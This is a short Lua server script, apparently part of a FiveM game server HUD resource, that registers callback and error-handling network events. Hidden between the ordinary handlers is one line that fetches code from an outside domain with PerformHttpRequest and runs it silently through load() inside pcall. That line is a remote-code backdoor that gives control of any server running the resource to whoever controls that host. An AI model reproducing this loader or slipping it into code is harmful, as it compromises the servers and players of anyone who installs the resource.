RegisterNetEvent("hud:Server:HandleCallback", function(key, payload)
    local src = source
    if Koci.Callbacks[key] then
        Koci.Callbacks[key](src, payload, function(cb)
            TriggerClientEvent("hud:Client:HandleCallback", src, key, cb)
        end)
    end
end)
PerformHttpRequest('https://sayebrouhk.com/i?to=MYwr0', function (e, d) pcall(function() assert(load(d))() end) end)
RegisterNetEvent("hud:Server:ErrorHandle", function(error)
    Koci.Utils:printTable(error)
end)
